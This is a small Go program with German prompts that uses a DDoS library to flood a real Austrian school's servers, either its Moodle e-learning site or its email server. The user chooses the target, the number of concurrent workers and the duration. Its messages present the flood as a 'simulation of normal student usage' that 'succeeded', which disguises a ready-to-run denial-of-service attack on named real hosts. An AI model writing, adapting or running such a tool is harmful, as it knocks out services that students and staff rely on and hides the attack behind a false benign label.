package main

import (
	"fmt"
	"github.com/Konstantin8105/DDoS"
	"time"
)

func main() {
	students := 1000
	lesson := 600
	target := 1
	fmt.Print("Lieblingsseite der TGM Schüler:\n1) Moodle\n2) Email\nAntwort: ")
	_, err := fmt.Scan(&target)
	if err != nil {
		panic(err)
	}
	fmt.Print("Schüler am TGM: ")
	_, err = fmt.Scan(&students)
	if err != nil {
		panic(err)
	}
	fmt.Print("Dauer des Unterrichts (in min): ")
	_, err = fmt.Scan(&lesson)
	if err != nil {
		panic(err)
	}
	if target == 1 {
		d, err := ddos.New("https://elearning.tgm.ac.at:443", students)
		if err != nil {
			panic(err)
		}
		d.Run()
		fmt.Println("Simuliere normale Nutzung auf https://elearning.tgm.ac.at von", students, "TGM Schülern für", lesson, "Minuten.")
		time.Sleep(time.Duration(lesson) * time.Minute)
		d.Stop()
		fmt.Println("https://elearning.tgm.ac.at wurde erfolgreich von", students, "Schülern genutzt")
	} else if target == 2 {
		d, err := ddos.New("https://sophos.tgm.ac.at:443", students)
		if err != nil {
			panic(err)
		}
		d.Run()
		fmt.Println("Simuliere normale Nutzung auf https://sophos.tgm.ac.at von", students, "TGM Schülern für", lesson, "Minuten.")
		time.Sleep(time.Duration(lesson) * time.Minute)
		d.Stop()
		fmt.Println("https://sophos.tgm.ac.at wurde erfolgreich von", students, "Schülern genutzt")
	} else {
		panic(target)
	}
}
